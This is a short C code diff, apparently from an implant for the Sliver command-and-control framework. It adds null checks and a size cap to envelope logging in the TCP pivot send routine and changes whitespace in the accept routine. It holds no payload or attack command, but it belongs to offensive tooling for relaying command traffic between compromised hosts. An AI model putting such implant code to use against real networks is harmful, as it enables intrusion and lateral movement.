@@ -429,8 +429,23 @@ BOOL TcpSend
 	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
 	ENVELOPE FinalEnvelope;
 
-	PrintFormatA("Write Envelope:\n");
-	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+	if (pEnvelope == NULL) {
+		goto CLEANUP;
+	}
+
+	if (pEnvelope->pData != NULL) {
+		PrintFormatA("Write Envelope:\n");
+		if (pEnvelope->pData->cbBuffer > 0x1000) {
+			HexDump(pEnvelope->pData->pBuffer, 0x1000);
+		}
+		else {
+			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+		}
+	}
+	else {
+		PrintFormatW(L"Write Envelope: []\n");
+	}
+
 	pPlainText = MarshalEnvelope(pEnvelope);
 	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
 		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
@@ -495,7 +510,7 @@ PPIVOT_CONNECTION TcpAccept
 		LOG_ERROR("ioctlsocket", WSAGetLastError());
 		goto CLEANUP;
 	}
-
+	
 	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
 	/*pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
 	pResult->lpHost = DuplicateStrA(szHost, 0);
